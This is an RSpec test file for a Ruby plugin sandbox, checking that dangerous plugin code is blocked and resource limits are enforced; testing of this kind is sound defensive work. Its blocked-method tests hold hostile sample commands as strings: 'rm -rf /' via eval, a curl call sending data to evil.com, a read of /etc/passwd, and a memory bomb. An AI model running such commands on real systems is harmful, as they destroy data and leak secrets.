# frozen_string_literal: true

require 'spec_helper'
require_relative '../../lib/number_analyzer/plugin_sandbox'

RSpec.describe NumberAnalyzer::PluginSandbox do
  let(:sandbox) { described_class.new(security_level: :test) }
  let(:strict_sandbox) { described_class.new(security_level: :production) }

  describe 'Method Interception' do
    describe 'dangerous methods are blocked' do
      it 'blocks eval' do
        malicious_code = 'eval("system(\'rm -rf /\')")'

        expect do
          sandbox.execute_plugin(malicious_code, plugin_name: 'test_eval')
        end.to raise_error(NumberAnalyzer::PluginSecurityError, /eval.*prohibited/)
      end

      it 'blocks system commands' do
        malicious_code = 'system("curl http://evil.com/steal-data")'

        expect do
          sandbox.execute_plugin(malicious_code, plugin_name: 'test_system')
        end.to raise_error(NumberAnalyzer::PluginSecurityError, /system.*not allowed/)
      end

      it 'blocks file access' do
        malicious_code = 'File.read("/etc/passwd")'

        expect do
          sandbox.execute_plugin(malicious_code, plugin_name: 'test_file')
        end.to raise_error(NumberAnalyzer::PluginSecurityError, /File.*prohibited/)
      end

      it 'blocks require statements' do
        malicious_code = 'require "socket"'

        expect do
          sandbox.execute_plugin(malicious_code, plugin_name: 'test_require')
        end.to raise_error(NumberAnalyzer::PluginSecurityError, /require.*restricted/)
      end

      it 'blocks send method' do
        malicious_code = 'Object.send(:system, "whoami")'

        expect do
          sandbox.execute_plugin(malicious_code, plugin_name: 'test_send')
        end.to raise_error(NumberAnalyzer::PluginSecurityError, /send.*not permitted/)
      end

      it 'blocks thread creation' do
        malicious_code = 'Thread.new { system("malicious_command") }'

        expect do
          sandbox.execute_plugin(malicious_code, plugin_name: 'test_thread')
        end.to raise_error(NumberAnalyzer::PluginSecurityError, /Thread.*restricted/)
      end
    end

    describe 'safe methods are allowed' do
      it 'allows basic math' do
        safe_code = '[1, 2, 3, 4, 5].sum'

        result = sandbox.execute_plugin(safe_code, plugin_name: 'test_sum')
        expect(result).to eq(15)
      end

      it 'allows array operations' do
        safe_code = '[1, 2, 3, 4, 5].map { |x| x * 2 }'

        result = sandbox.execute_plugin(safe_code, plugin_name: 'test_map')
        expect(result).to eq([2, 4, 6, 8, 10])
      end

      it 'allows string operations' do
        safe_code = '"Hello World".upcase'

        result = sandbox.execute_plugin(safe_code, plugin_name: 'test_string')
        expect(result).to eq('HELLO WORLD')
      end

      it 'allows statistical calculations' do
        # This would work if NumberAnalyzer methods are available
        safe_code = 'data = [1, 2, 3, 4, 5]; data.sum.to_f / data.length'

        result = sandbox.execute_plugin(safe_code, plugin_name: 'test_stats')
        expect(result).to eq(3.0)
      end
    end
  end

  describe 'Resource Control' do
    it 'stops infinite loops' do
      infinite_loop = 'loop { }'

      expect do
        sandbox.execute_plugin(infinite_loop, plugin_name: 'test_infinite_loop')
      end.to raise_error(NumberAnalyzer::PluginTimeoutError, /time limit exceeded/)
    end

    it 'prevents excessive memory usage' do
      # Create a plugin that tries to allocate huge amounts of memory
      memory_bomb = 'Array.new(1_000_000, "x" * 1000)'

      expect do
        sandbox.execute_plugin(memory_bomb, plugin_name: 'test_memory_bomb')
      end.to raise_error(NumberAnalyzer::PluginResourceError, /Memory limit exceeded/)
    end

    it 'limits output size' do
      # Create massive output
      large_output = '"x" * 2_000_000'

      expect do
        sandbox.execute_plugin(large_output, plugin_name: 'test_large_output')
      end.to raise_error(NumberAnalyzer::PluginResourceError, /Output size limit exceeded/)
    end

    it 'allows normal resource usage' do
      normal_code = '(1..100).to_a.sum'

      result = sandbox.execute_plugin(normal_code, plugin_name: 'test_normal')
      expect(result).to eq(5050)
    end
  end

  describe 'Capability Management' do
    it 'auto-grants low-risk capabilities' do
      code = 'data = [1, 2, 3]; data.sum'
      capabilities = %i[read_data write_output]

      result = sandbox.execute_plugin(code, plugin_name: 'test_capabilities', capabilities: capabilities)
      expect(result).to eq(6)
    end

    it 'blocks high-risk capabilities without approval' do
      code = 'puts "test"'
      capabilities = [:network_access]

      expect do
        sandbox.execute_plugin(code, plugin_name: 'test_high_risk', capabilities: capabilities)
      end.to raise_error(NumberAnalyzer::PluginCapabilityError, /requires explicit approval/)
    end

    it 'allows trusted plugins to use any capability' do
      trusted_sandbox = described_class.new(
        security_level: :production,
        trusted_plugins: ['trusted_plugin']
      )

      code = '[1, 2, 3].sum'
      capabilities = %i[network_access external_command]

      expect do
        trusted_sandbox.execute_plugin(code, plugin_name: 'trusted_plugin', capabilities: capabilities)
      end.not_to raise_error
    end
  end

  describe 'Syntax Validation' do
    it 'catches syntax errors' do
      invalid_code = 'puts "unclosed string'

      expect do
        sandbox.execute_plugin(invalid_code, plugin_name: 'test_syntax')
      end.to raise_error(NumberAnalyzer::PluginSyntaxError, /syntax error/)
    end

    it 'allows valid syntax' do
      valid_code = 'puts "valid code"; 42'

      expect do
        sandbox.execute_plugin(valid_code, plugin_name: 'test_valid_syntax')
      end.not_to raise_error(NumberAnalyzer::PluginSyntaxError)
    end
  end

  describe 'Security Levels' do
    describe 'development mode' do
      let(:dev_sandbox) { described_class.new(security_level: :development) }

      it 'disables sandboxing' do
        # In development mode, even dangerous code should execute
        # (This is for testing purposes only)
        code = '2 + 2' # Use safe code for actual test

        expect do
          dev_sandbox.execute_plugin(code, plugin_name: 'dev_test')
        end.not_to raise_error
      end
    end

    describe 'production mode' do
      it 'enables strict sandboxing' do
        code = 'eval("puts 42")'

        expect do
          strict_sandbox.execute_plugin(code, plugin_name: 'prod_test')
        end.to raise_error(NumberAnalyzer::PluginSecurityError)
      end
    end
  end

  describe 'Plugin File Loading' do
    it 'loads plugin from file with sandboxing' do
      # Create a temporary plugin file
      plugin_content = '[1, 2, 3, 4, 5].sum'
      plugin_file = '/tmp/test_plugin.rb'

      File.write(plugin_file, plugin_content)

      begin
        result = sandbox.load_plugin_file(plugin_file, plugin_name: 'file_test')
        expect(result).to eq(15)
      ensure
        FileUtils.rm_f(plugin_file)
      end
    end
  end

  describe 'Error Handling' do
    it 'provides helpful error messages for blocked methods' do
      expect do
        sandbox.execute_plugin('system("ls")', plugin_name: 'error_test')
      end.to raise_error(NumberAnalyzer::PluginSecurityError)

      # Verify error message content separately
      begin
        sandbox.execute_plugin('system("ls")', plugin_name: 'error_test')
      rescue NumberAnalyzer::PluginSecurityError => e
        expect(e.message).to include('system')
        expect(e.message).to include('not allowed')
      end
    end

    it 'wraps execution errors appropriately' do
      # Code that will raise a standard error
      error_code = 'raise StandardError, "plugin error"'

      expect do
        sandbox.execute_plugin(error_code, plugin_name: 'error_test')
      end.to raise_error(NumberAnalyzer::PluginExecutionError, /plugin error/)
    end
  end

  describe 'Logging and Monitoring' do
    it 'logs security events' do
      # Capture output to verify logging
      expect do
        sandbox.execute_plugin('[1, 2, 3].sum', plugin_name: 'log_test')
      end.to output(/PLUGIN_EXECUTION_START.*log_test/).to_stdout
    end

    it 'logs violations' do
      expect do
        sandbox.execute_plugin('eval("test")', plugin_name: 'violation_test')
      rescue NumberAnalyzer::PluginSecurityError
        # Expected to fail
      end.to output(/PLUGIN_EXECUTION_ERROR.*violation_test/).to_stdout
    end
  end
end
